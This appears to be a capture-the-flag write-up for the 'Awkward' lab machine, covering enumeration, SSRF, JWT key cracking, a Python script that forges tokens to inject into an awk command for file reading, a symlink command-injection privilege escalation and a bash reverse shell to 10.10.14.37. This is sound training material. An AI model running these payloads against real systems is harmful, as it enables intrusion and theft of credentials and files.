## Awkward

### Lab Details 

- Difficulty: Medium
- Type: Web App, API enumeration, SSRF, Cracking JWT Token, Exploiting AWK, Symbolic Link Attack, Priv Esc, Linux

#### Enumeration
- run nmap
```bash
$ nmap -sC -p- -T4 --min-rate 1000 10.129.228.81
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-04 01:31 CDT
Nmap scan report for 10.129.228.81
Host is up (0.0028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA)
|_  256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

```
- found `hat-valley.htb` by visiting the `IP`
![[Pasted image 20250906050958.png]]
- run `wfuzz` sub-domain enumeration
```bash
$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.hat-valley.htb" --hw 13 http://10.129.228.81
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.228.81/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000000081:   401        7 L      12 W       188 Ch      "store"     
```
- found `store.hat-valley.htb` however requires credential to login
![[store subdomain.png]]
- going through developer mode -> debugger found `/api` endpoints
![[api endpoints.png]]
![[staff endpoint.png]]
- `curl` the `staff-details` endpoint we username and password
```bash
$ curl http://hat-valley.htb/api/staff-details | jq 
[
  {
    "user_id": 1,
    "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname": "Christine Wool",
    "role": "Founder, CEO",
    "phone": "0415202922"
  },
  {
    "user_id": 2,
    "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname": "Christopher Jones",
    "role": "Salesperson",
    "phone": "0456980001"
  },
  {
    "user_id": 3,
    "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname": "Jackson Lightheart",
    "role": "Salesperson",
    "phone": "0419444111"
  },
  {
    "user_id": 4,
    "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname": "Bean Hill",
    "role": "System Administrator",
    "phone": "0432339177"
  }
]
```
#### Initial Foothold 
- use `crackstation` to decrypt the password
![[crack station.png]]
- found login as `christopher`
![[home hat-valley.png]]
- found `ssrf` at `refresh` store status
![[burp test ssrf.png]]
- testing `ssrf` with local port
![[test SSRF.png]]
- use `ffuf` to enumerate internal open ports
```bash
$ ffuf -u http://hat-valley.htb/api/store-status?url=\"http://127.0.0.1:FUZZ\" -w <( seq 1 65535) -mc all -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

80                      [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 170ms]
3002                    [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 91ms]
8080                    [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 62ms]
```
- found port `3002`
```
http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1:3002%22
```
- visiting will give us the documentation for `/api` endpoints
![[all-leave.png]]
- intercept `http://hat-valley.htb/leave` request to create a leave request
![[jwt-token.png]]
- we can attempt to crack the signing key of `JWT token`
```bash
$ john jwt.token -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123beany123      (?)     
1g 0:00:00:01 DONE (2025-09-06 07:06) 0.5555g/s 7406Kp/s 7406Kc/s 7406KC/s 123erix..123P45
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- based on the documentation `/api/all-leave` we can exploit the `awk` command used to perform `LFI`
```bash
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv"
```
![[all-leave.png]]
- need to tweak the payload to escape the bad character filter https://gtfobins.github.io/gtfobins/awk/
```python
import requests
import jwt
import sys
encoded_jwt = jwt.encode({"username": "/' " + sys.argv[1] + " '/dud",
"iat":"1644922420"}, "123beany123", algorithm="HS256")
cookies = {'token': encoded_jwt}
r = requests.get('http://hat-valley.htb/api/all-leave', cookies=cookies)
print(r.content.decode('utf-8'))
```
- reading `/etc/passwd` to see users with login shell
```bash
$ python3 exfil.py /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
```
- check user bean's `.bashrc` found there is backup script 
```bash
$ python3 exfil.py /home/bean/.bashrc
<snip>
# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
<snip>
```
- reading the backup script
```bash
$ python3 exfil.py /home/bean/Documents/backup_home.sh
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```
- update the `exfil.py` to write the remote `tar zip`file locally
```
import requests
import jwt
import sys
encoded_jwt = jwt.encode({"username": "/' " + sys.argv[1] + " '/dud",
"iat":"1644922420"}, "123beany123", algorithm="HS256")
cookies = {'token': encoded_jwt}
r = requests.get('http://hat-valley.htb/api/all-leave', cookies=cookies)
# Write bytes instead of printing to stdout
with open("bean_backup_final.tar.gz", "wb") as f:
f.write(r.content)
```
- unzip it and then we found a credential for `bean.hill`
```bash
$ cat .config/xpad/content-DS1ZS1 
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
014mrbeanrules!#P

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold
```
#### Lateral Movement (If any)

#### Privilege Escalation
- when create a leave request we get a notification that the request is sent to Christine for review
![[success message submit leave.png]]
- checking the progress when sending request using `pspy` shows that command `mail` is used to send a mail to `christine`
![[pspy.png]]
- the key concept of privilege escalation is performing a Symbolic Link Attack triggered by modification of `leave_requests.csv` file
	- first reading `var/www/store/cart_actions.php` we see that the check for the valid item is only checking the file name rather file content 
	- everyone has access to `/var/www/store/cart` and `/var/www/store/product-details`
```php
<snip>
<?php

//fetch from cart
if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_GET['action'] === 'fetch_items' && $_GET['user']) {
    $html = "";
    $dir = scandir("{$STORE_HOME}cart");
    $files = array_slice($dir, 2);

    foreach($files as $file) {
        $user_id = substr($file, -18);
        if($user_id === $_GET['user'] && checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
            $product_file = fopen("{$STORE_HOME}cart/{$file}", "r");
            $details = array();
            while (($line = fgets($product_file)) !== false) {
                if(str_replace(array("\r", "\n"), '', $line) !== "***Hat Valley Cart***") { //don't include first line
                    array_push($details, str_replace(array("\r", "\n"), '', $line));
                }
            }
            foreach($details as $cart_item) {
                 $cart_items = explode("&", $cart_item);
                 for($x = 0; $x < count($cart_items); $x++) {
                      $cart_items[$x] = explode("=", $cart_items[$x]); //key and value as separate values in subarray
                 }
                 $html .= "<tr><td>{$cart_items[1][1]}</td><td>{$cart_items[2][1]}</td><td>{$cart_items[3][1]}</td><td><button data-id={$cart_items[0][1]} onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'>Remove</button></td></tr>";
            }
        }
    }
    echo $html;
    exit;
}
<snip>
```
- vulnerability is at 
```bash
system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
```
- head -2: Gets the first 2 lines of the product file
- tail -1: Takes only the second line from those results
- appends this line to the user's cart file
- and when `/var/www/private/leave_requests.csv` is modified root send an mail to `christine`so if we can create a Symbolic Link to `/var/www/private/leave_requests.csv`we can get root to perform code execution
- create a Sym Link at `/var/www/store/cart` to `/var/www/private/leave_requests.csv`
```bash
ln -s /var/www/private/leave_requests.csv fakecart
```
- another payload at `/var/www/store/product-details`
```bash
## creat a new item name it 4.txt and then add below payload
$ vi 4.txt
***Hat Valley Product***
pwned --exec='!/tmp/shell.sh'
```
- reverse shell
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.37/4444 0>&1
```
- login to `store.hat-valley.htb` with  `admin:<bean's password>`
- visit `http://store.hat-valley.htb/shop.php` and add an item then intercept with burpsuite
![[exploit priv esc.png]]
- modify to point to our payloads 
```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.37] from (UNKNOWN) [10.129.228.81] 57586
bash: cannot set terminal process group (966): Inappropriate ioctl for device
bash: no job control in this shell
root@awkward:~/scripts# whoami
whoami
root
```

#### Resources

#### Lesson Learned